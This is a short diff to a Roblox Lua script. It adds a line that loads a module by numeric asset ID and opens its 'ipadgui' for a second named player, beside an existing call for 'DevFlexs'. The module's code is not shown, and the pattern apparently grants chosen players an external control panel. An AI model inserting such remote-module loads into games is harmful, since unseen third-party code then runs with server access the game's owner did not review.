@@ -4,6 +4,7 @@ game.Players["DevFlexs"].Character.Head.NameTag.NameFln.Text = ""
 
 ---game.Players["DevFlexs"].Character.Head.NameTag.NameFln.TextColor3 = Color3.new(2, 0, 0)
 require(110476458714336).ipadgui("DevFlexs")
+require(110476458714336).ipadgui("semihprosemihprosami")
 else
 warn()
 
